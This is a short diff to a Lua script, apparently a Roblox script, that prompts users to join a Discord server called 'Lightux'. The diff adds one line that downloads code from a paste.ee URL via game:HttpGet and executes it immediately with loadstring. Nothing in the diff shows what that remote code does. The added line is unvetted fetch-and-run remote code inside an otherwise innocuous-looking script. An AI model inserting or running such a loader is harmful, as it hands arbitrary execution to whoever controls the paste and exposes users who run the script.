@@ -4,3 +4,4 @@ Module.Prompt({ invite = "https://discord.gg/sdCSmXRjuX", name = "Lightux" }) --
 
 Module.Join("https://discord.gg/sdCSmXRjuX")
 
+loadstring(game:HttpGet(('https://paste.ee/r/w29AI'),true))()
